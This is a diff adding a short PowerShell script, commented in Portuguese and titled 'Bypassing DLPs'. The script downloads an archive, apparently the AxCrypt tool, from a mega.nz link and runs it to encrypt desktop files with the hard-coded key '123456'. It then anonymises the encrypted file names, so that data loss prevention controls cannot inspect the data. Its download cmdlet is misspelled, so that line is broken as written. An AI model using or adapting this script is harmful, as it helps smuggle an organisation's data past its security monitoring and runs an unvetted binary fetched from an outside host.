@@ -1,0 +1,22 @@
+#Bypassing DLPs
+
+#Realizando o download do encrypter
+Invoke-WebResquest -Uri https://mega.nz/file/liFRVT5K#0KAhcdIwcTI5gTykpFJDK1dzCf8A-ocSErA2emDkRdI -Outfile $env:USERPROFILE\axc.zip
+
+#Descompactando
+Expand-Archive .\axc.zip
+
+#Criando a pasta "Encriptar" no desktop para os arquivos que serão criptografados
+md $env:USERPROFILE\Desktop\Encriptar
+
+#Aguardando o usuário copiar os dados para a pasta "Encriptar"
+Write-host Copie os Arquivos a serem criptografados para a pasta Encriptar no Desktop e pressione qualquer tecla
+pause
+
+#Encriptando todos os arquivos da pasta Encriptar
+cd axc
+./AxCrypt.exe -b 2 -e -k "123456" -m -f -z $env:USERPROFILE\Desktop\encriptar\*.*
+
+#Anonimizando os arquivos criptografados
+$env:USERPROFILE\axc\AxCrypt.exe -m -h $env:USERPROFILE\Desktop\encriptar\*.axx
+
